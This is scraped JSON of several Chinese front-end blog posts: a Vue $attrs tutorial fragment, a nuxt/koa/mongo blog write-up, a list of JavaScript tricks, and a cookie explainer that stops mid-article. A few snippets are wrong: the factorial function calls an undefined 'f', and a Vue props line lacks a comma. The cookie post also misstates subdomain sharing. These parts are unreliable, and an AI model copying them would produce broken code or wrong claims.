class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>foo: {{ foo }}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>attrs: {{ $attrs }}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-com2</span> <span class=\"hljs-attr\">v-bind</span>=<span class=\"hljs-string\">\"$attrs\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-com2</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span></span>\n  &lt;script&gt;\n  <span class=\"hljs-keyword\">const</span> childCom2 = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> <span class=\"hljs-keyword\">import</span>(<span class=\"hljs-string\">'./childCom2.vue'</span>)\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    <span class=\"hljs-attr\">props</span>: [<span class=\"hljs-string\">'foo'</span>],\n    <span class=\"hljs-attr\">inheritAttrs</span>: <span class=\"hljs-literal\">false</span>,\n    created () {\n      <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.$attrs) <span class=\"hljs-comment\">// { boo: 'Hello Javascript!', coo: 'Hello Vue', doo: 'Last' }</span>\n    }\n  }\n  &lt;<span class=\"hljs-regexp\">/script&gt;</span></code></pre><pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// childCom2.vue</span>\n  &lt;template&gt;\n    <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>boo: {{ boo }}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>attrs: {{ $attrs }}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-com3</span> <span class=\"hljs-attr\">v-bind</span>=<span class=\"hljs-string\">\"$attrs\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-com3</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span></span>\n\n  &lt;script&gt;\n  <span class=\"hljs-keyword\">const</span> childCom3 = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> <span class=\"hljs-keyword\">import</span>(<span class=\"hljs-string\">'./childCom3.vue'</span>)\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    <span class=\"hljs-attr\">props</span>: [<span class=\"hljs-string\">'boo'</span>]\n    inheritAttrs: <span class=\"hljs-literal\">false</span>,\n    created () {\n      <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.$attrs) <span class=\"hljs-comment\">// { coo: 'Hello Vue', doo: 'Last' }</span>\n    }\n  }\n  &lt;<span class=\"hljs-regexp\">/script&gt;</span></code></pre><pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// childCom3.vue</span>\n  <span class=\"hljs-comment\">// ...</span></code></pre><p>  最后被渲染为</p>\n<p>  </p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://github.com/jkchao/blog/raw/master/vue/render.png\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>  具体请看 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo6.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo6</a> 。</p>\n<p>  <code>$listeners</code> 的用法和 <code>$attrs</code> 类似，<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo6.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo6</a> 。</p>\n</li>\n</ul>\n<hr>\n<p>完。</p>\n</div>"},{"title":"nuxt(vue) + koa + mongo 写blog的一次小结","avatar":"https://user-gold-cdn.xitu.io/2017/5/8/8f921da3774a31d840cff839fd4283b8?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"三毛丶","create_time":"2017 年 09 月 29 日","tags":["Node.js","Vue.js","MongoDB","前端","Vuex","vue-router"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p>两个多月的空余时间里，博客差不多搭完。</p>\n<ul>\n<li>感谢<a href=\"https://link.juejin.im?target=https%3A%2F%2Fsurmon.me%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">surmon.me</a>，此 blog 才会诞生。 </li>\n<li>感谢七牛云提供资源存储。</li>\n<li>感谢腾讯云 提供 SSL 证书。</li>\n<li>感谢各种开源。</li>\n</ul>\n</blockquote>\n<p>体验地址： <a href=\"https://link.juejin.im?target=https%3A%2F%2Fjkchao.cn\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">jkchao.cn</a> </p>\n<hr>\n<h1 id=\"nuxt-vue-koa-mongo-blog-\" data-id=\"heading-0\">nuxt(vue) + koa + mongo 写blog的一次小结</h1>\n<p>CLIENT: <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-blog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-blog</a></p>\n<p>ADMIN: <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-admin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-admin</a></p>\n<p>SERVICE: <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fnode-koa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">node-koa</a></p>\n<hr>\n<h2 data-id=\"heading-1\">CLIENT</h2>\n<p>相关截图</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/8daee3427788558c08ff6fee63bece87?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/007f6aebefae2e00781993b24312649e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/34360254cf0432eeca3cb32e138ccbc2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/34926c92a8b00471d8c94b1513d53aff?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 data-id=\"heading-2\">主要技术栈</h3>\n<ul>\n<li><p>nuxt (vue)</p>\n</li>\n<li><p>vuex + vue-router + axios</p>\n</li>\n<li><p>marked + highlight</p>\n</li>\n<li><p>...</p>\n</li>\n</ul>\n<h2 data-id=\"heading-3\">AMDIN</h2>\n<p>相关截图</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/bd5ca92c111f1c20a0c678a6a3081654?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/f76a5c67d6f521ffaaccdba4dc5529c2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/da247454a793c168dddd1457e2383cec?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/29/0c270a06a331320f472320307c51774a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 data-id=\"heading-4\">技术栈</h3>\n<ul>\n<li><p>vue</p>\n</li>\n<li><p>vuex + vue-router + axios + Element</p>\n</li>\n<li><p>权限部分，登录时接受服务器返回的 token，储存在本地， 使用 axios 拦截，以及 vue-router 路由元信息部分拦截，会检查 token 以及是否过期。</p>\n</li>\n<li><p>markdown 使用插件 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FF-loat%2Fvue-simplemde\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-simplemde</a></p>\n</li>\n<li><p>使用 element-ui 上传组件配合七牛。</p>\n</li>\n<li><p>...</p>\n</li>\n</ul>\n<h2 data-id=\"heading-5\">SERVER</h2>\n<h3 data-id=\"heading-6\">主要技术栈</h3>\n<ul>\n<li><p>koa2</p>\n</li>\n<li><p>数据库 mongo</p>\n</li>\n<li><p>权限 jwt</p>\n</li>\n<li><p>...</p>\n</li>\n</ul>\n<p>node 版本 6.x+，使用前，请安装mongodb。</p>\n<h2 data-id=\"heading-7\">发布</h2>\n<ul>\n<li><p>完成项目后，将发布到自己服务器上，先确保已安装node, mongodb</p>\n</li>\n<li><p>pm2 项目管理</p>\n</li>\n<li><p>nginx 反向代理</p>\n</li>\n</ul>\n<h1 data-id=\"heading-8\">TODO</h1>\n<ul>\n<li><p>加入网易云音乐</p>\n</li>\n<li><p>使用 redis 对一部分数据进行缓存处理</p>\n</li>\n<li><p>admin 我的面板统计优化</p>\n</li>\n<li><p>Google Analytics 统计</p>\n</li>\n<li><p>electron 桌面应用</p>\n</li>\n<li><p>weex ?</p>\n</li>\n</ul>\n</div>"},{"title":"JavaScript 骚操作","avatar":"https://user-gold-cdn.xitu.io/2017/9/13/084e00d22e6425d749e71a1da16c1dda?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"白小明","create_time":"2017 年 10 月 03 日","tags":[],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">前言</h2>\n<p>如有错误，欢迎批评指正！</p>\n<p>技术无极限，唯一的限制是你的想象力！</p>\n<p>在JavaScript世界中，有些操作会让你无法理解，但是却无比优雅。比如下面这些：</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/3/0b17e3e7381e0e2076f9509eebf18b0a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"https://user-gold-cdn.xitu.io/2017/10/3/0b17e3e7381e0e2076f9509eebf18b0a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<h2 data-id=\"heading-1\">5种方式实现值交换</h2>\n<p>下面几种方式都行</p>\n<pre><code class=\"hljs bash\">1. var temp = a; a = b; b = temp; (传统，但需要借助临时变量)\n2. a ^= b; b ^= a; a ^= b; (需要两个整数)\n3. b = [a, a = b][0] (借助数组)\n4. [a, b] = [b, a]; (ES6，解构赋值)\n5. a = a + b; b = a - b; a = a - b; (小学奥赛题)</code></pre><h2 data-id=\"heading-2\">去掉小数部分</h2>\n<p>下面几种方式都行</p>\n<pre><code class=\"hljs bash\">parseInt(num)\n~~num\nnum &gt;&gt; 0\nnum | 0</code></pre><h2 data-id=\"heading-3\">判断 x 是否是整数</h2>\n<p>下面几种方式都行</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> isInt(x) {\n  <span class=\"hljs-built_in\">return</span> (x ^ 0) === x\n}\n// <span class=\"hljs-built_in\">return</span> Math.round(x) === x\n// <span class=\"hljs-built_in\">return</span> (typeof x === <span class=\"hljs-string\">'number'</span>) &amp;&amp; (x % 1 === 0)\n// ES6 -&gt; Number.isInteger()</code></pre><h2 data-id=\"heading-4\">递归求阶乘</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> factorial(n) {\n  <span class=\"hljs-built_in\">return</span> (n &gt; 1) ? n * f(n - 1) : n\n}</code></pre><h2 data-id=\"heading-5\">判断符号是否相同</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> sameSign(a, b) {\n  <span class=\"hljs-built_in\">return</span> (a ^ b) &gt;= 0\n}</code></pre><h2 data-id=\"heading-6\">克隆数组</h2>\n<pre><code class=\"hljs bash\">arr.slice(0)</code></pre><h2 data-id=\"heading-7\">数组去重</h2>\n<pre><code class=\"hljs bash\">// ES6\nArray.from(new Set(arr))\n\n// ES5\narr.filter(<span class=\"hljs-keyword\">function</span>(ele, index, array){\n    <span class=\"hljs-built_in\">return</span> index===array.indexOf(ele)\n})</code></pre><h2 data-id=\"heading-8\">数组最大值</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> maxArr(arr) {\n  <span class=\"hljs-built_in\">return</span> Math.max.apply(null, arr)\n}</code></pre><h2 data-id=\"heading-9\">数组最小值</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> minArr(arr) {\n  <span class=\"hljs-built_in\">return</span> Math.min.apply(null, arr)\n}</code></pre><h2 data-id=\"heading-10\">随机获取数组的一个成员</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> randomOne(arr) {\n  <span class=\"hljs-built_in\">return</span> arr[Math.floor(Math.random() * arr.length)]\n}</code></pre><h2 data-id=\"heading-11\">产生随机颜色</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">getRandomColor</span></span>() {\n    <span class=\"hljs-built_in\">return</span> `<span class=\"hljs-comment\">#${Math.random().toString(16).substr(2, 6)}`</span>\n}</code></pre><h2 data-id=\"heading-12\">随机生成指定长度的字符串</h2>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> randomStr(n) {\n  <span class=\"hljs-built_in\">let</span> standard = <span class=\"hljs-string\">'abcdefghijklmnopqrstuvwxyz9876543210'</span>\n  <span class=\"hljs-built_in\">let</span> len = standard.length\n  <span class=\"hljs-built_in\">let</span> result = <span class=\"hljs-string\">''</span>\n\n  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; n; i++) {\n    result += standard.charAt(Math.floor(Math.random() * len))\n  }\n\n  <span class=\"hljs-built_in\">return</span> result\n}</code></pre><h2 data-id=\"heading-13\">深拷贝</h2>\n<pre><code class=\"hljs bash\">JSON.parse(JSON.stringify(obj))</code></pre><h2 data-id=\"heading-14\">打印出来看看</h2>\n<pre><code class=\"hljs bash\">console.log(([][[]] + [])[+!![]] + ([] + {})[!+[] + !![]])\n\nconsole.log((!(~+[]) + {})[--[~+<span class=\"hljs-string\">''</span>][+[]] * [~+[]] + ~~!+[]] + ({} + [])[[~!+[]] * ~+[]])</code></pre><h3 id=\"-console\" data-id=\"heading-15\">美化console</h3>\n<pre><code class=\"hljs bash\">console.info(<span class=\"hljs-string\">\"%c哈哈\"</span>, <span class=\"hljs-string\">\"color: #3190e8; font-size: 30px; font-family: sans-serif\"</span>);</code></pre><p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/3/4c71ea3419145e520dd88485962f18df?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n</div>"},null,null,{"title":"把cookie聊清楚","avatar":"https://avatars0.githubusercontent.com/u/28126886?v=3","author":"laihuamin","create_time":"2017 年 10 月 02 日","tags":["浏览器","前端","服务器","百度"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 id=\"-\" data-id=\"heading-0\">前言</h2>\n<p>cookie在web开发中时常被用到，也是面试官喜欢问的一块技术，很多人或许和我以前一样，只知其一不知其二，谈起web存储，都会答localStorage、sessionStorage、还有就是cookie，然后一些区别啊什么的倒背如流，cookie的优缺点也了然于心，但是当你看完这块内容之后，你会对cookie有另外独到的见解，希望以后问到这块技术，或者项目中遇到这个你都会处理，我在实习的过程中，一直在用，所以它真的不是口头说说的那么简单，让我们进入cookie的世界</p>\n<h2 id=\"cookie-\" data-id=\"heading-1\">cookie是什么</h2>\n<p>这个讲起来很简单，了解http的同学，肯定知道，http是一个不保存状态的协议，什么叫不保存状态，就是一个服务器是不清楚是不是同一个浏览器在访问他，在cookie之前，有另外的技术是可以解决，这里简单讲一下，就是在请求中插入一个token，然后在发送请求的时候，把这个东西带给服务器，这种方式是易出错，所以有了cookie的出现</p>\n<p></p><figure><img alt=\"cookie\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/9749a2f293a5b4f84d8a40b4e8657faf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"https://user-gold-cdn.xitu.io/2017/10/2/9749a2f293a5b4f84d8a40b4e8657faf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption>cookie</figcaption></figure><p></p>\n<p>cookie是什么，cookie就是一种浏览器管理状态的一个文件，它有name，也有value，后面那些看不见的是Domain、path等等，我们后面会介绍</p>\n<h2 id=\"cookie-\" data-id=\"heading-2\">cookie原理</h2>\n<p></p><figure><img alt=\"cookieSend\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/07ecb36c4820a66de90013f303cac8c0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>cookieSend</figcaption></figure><p></p>\n<p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会将cookie放入到响应请求中，在浏览器第二次发请求的时候，会把cookie带过去，服务端会辨别用户身份，当然服务器也可以修改cookie内容</p>\n<h2 id=\"cookie-\" data-id=\"heading-3\">cookie不可跨域</h2>\n<p>我就几个例子你就懂了，当我打开百度的网页，我要设置一个cookie的时候，我的指令如下</p>\n<pre><code class=\"hljs js\">javascript:<span class=\"hljs-built_in\">document</span>.cookie=<span class=\"hljs-string\">'myname=laihuamin;path=/;domain=.baidu.com'</span>;</code></pre><pre><code class=\"hljs js\">javascript:<span class=\"hljs-built_in\">document</span>.cookie=<span class=\"hljs-string\">'myname=huaminlai;path=/;domain=.google.com'</span>;</code></pre><p>当我将这两个语句都放到浏览器控制台运行的时候，你会发现一点,注意，上面两个cookie的值是不相同的，看清楚<br></p><figure><img alt=\"cookieDontDomain\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/ef12b6b1b2590434c959161d39fc7adc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>cookieDontDomain</figcaption></figure><br>显而易见的是，真正能把cookie设置上去的只有domain是.baidu.com的cookie绑定到了域名上，所以上面所说的不可跨域性，就是不能在不同的域名下用，每个cookie都会绑定单一的域名<p></p>\n<h2 id=\"cookie-\" data-id=\"heading-4\">cookie的属性</h2>\n<p>cookie的属性众多，我们可以来看一下下面这张图，然后我们一个一个分析</p>\n<p></p><figure><img alt=\"cookieAttr\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/88a294c5374093cedd41bb1ce50cd9d4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>cookieAttr</figcaption></figure><p></p>\n<h3 data-id=\"heading-5\">name</h3>\n<p>这个显而易见，就是代表cookie的名字的意思，一个域名下绑定的cookie，name不能相同，相同的name的值会被覆盖掉，有兴趣的同学可以试一试，我在项目中切实用到过</p>\n<h3 id=\"value\" data-id=\"heading-6\">value</h3>\n<p>这个就是每个cookie拥有的一个属性，它表示cookie的值，但是我在这里想说的不是这个，因为我在网上看到两种说法，如下：<br><br>1.cookie的值必须被URL编码<br><br>2.对cookie的值进行编码不是必须的，还举了原始文档中所说的，仅对三种符号必须进行编码：分号、逗号和空格</p>\n<p>这个东西得一分为二来看，先看下面的图</p>\n<p></p><figure><img alt=\"cookievalue\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/fb6f3ec85759285e8e9eb57fd979078b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>cookievalue</figcaption></figure><p></p>\n<p>我在网上看到那么一种说法：</p>\n<blockquote>\n<p>由于cookie规定是名称/值是不允许包含分号，逗号，空格的，所以为了不给用户到来麻烦，考虑服务器的兼容性，任何存储cookie的数据都应该被编码。</p>\n</blockquote>\n<h3 data-id=\"heading-7\">domain</h3>\n<p>这个是指的域名，这个代表的是，cookie绑定的域名，如果没有设置，就会自动绑定到执行语句的当前域，还有值得注意的点，统一个域名下的二级域名也是不可以交换使用cookie的，比如，你设置www.baidu.com和image.baidu.com,依旧是不能公用的</p>\n<h3 id=\"path\" data-id=\"heading-8\">path</h3>\n<p>path这个属性默认是'/'，这个值匹配的是web的路由，举个例子：</p>\n<pre><code class=\"hljs bash\">//默认路径\nwww.baidu.com\n//blog路径\nwww.baidu.com/blog</code></pre><p>我为什么说的是匹配呢，就是当你路径设置成/blog的时候，其实它会给/blog、/blogabc等等的绑定cookie</p>\n<h3 id=\"cookie-\" data-id=\"heading-9\">cookie的有效期</h3>\n<p></p><figure><img alt=\"cookieMaxAge\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/348aab52f1892d29ecd3a1e5e5167cb9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>cookieMaxAge</figcaption></figure><p></p>\n<p>什么是有效期，就是图中的Expires属性，一般浏览器的cookie都是默认储存的，当关闭浏览器结束这个会话的时候，这个cookie也就会被删除，这就是上图中的——session(会话储存)。</p>\n<p>如果你想要cookie存在一段时间，那么你可以通过设置Expires属性为未来的一个时间节点，Expires这个是代表当前时间的，这个属性已经逐渐被我们下面这个主人公所取代——Max-Age</p>\n<p>Max-Age，是以秒为单位的，Max-Age为正数时，cookie会在Max-Age秒之后，被删除，当Max-Age为负数时，表示的是临时储存，不会生出cookie文件，只会存在浏览器内存中，且只会在打开的浏览器窗口或者子窗口有效，一旦浏览器关闭，cookie就会消失，当Max-Age为0时，又会发生什么呢，删除cookie，因为cookie机制本身没有设置删除cookie，失效的cookie会被浏览器自动从内存中删除，所以，它实现的就是让cookie失效。</p>\n<h3 id=\"secure\" data-id=\"heading-10\">secure</h3>\n<p></p><figure><img alt=\"cookieSecure\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/dd48df2362163b22d8d69d21918d8835?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>cookieSecure</figcaption></figure><p></p>\n<p>这个属性译为安全，http不仅是无状态的，还是不安全的协议，容易被劫持，打个比方，你在手机端浏览网页的时候，有没有中国移动图标跳出来过，闲言少叙，当这个属性设置为true时，此cookie只会在https和ssl等安全协议下传输</p>\n<ul>\n<li>提示：这个属性并不能对客户端的cookie进行加密，不能保证绝对的安全性</li>\n</ul>\n<h3 id=\"httponly\" data-id=\"heading-11\">HttpOnly</h3>\n<p>这个属性是面试的时候常考的，如果这个属性设置为true，就不能通过js脚本来获取cookie的值，能有效的防止xss攻击,看MDN的官方文档：<br></p><figure><img alt=\"httpOnly\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/cf582beb568a79b1d9dd8ef97be707f6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>httpOnly</figcaption></figure><p></p>\n<h3 id=\"-js-cookie\" data-id=\"heading-12\">关于js操作cookie</h3>\n<p>document.cookie可以对cookie进行读写，看一下两条指令：</p>\n<pre><code class=\"hljs bash\">//读取浏览器中的cookie\nconsole.log(document.cookie);\n//写入cookie\ndocument.cookie=<span class=\"hljs-string\">'myname=laihuamin;path=/;domain=.baidu.com'</span>;</code></pre><h3 id=\"-cookie\" data-id=\"heading-13\">服务端如何去设置cookie</h3>\n<p>关于怎么设置cookie，我们只要打开控制台，看一个http的请求头和响应头中的东西即可明白：<br></p><figure><img alt=\"setCookie\" class=\"lazyload inited\" 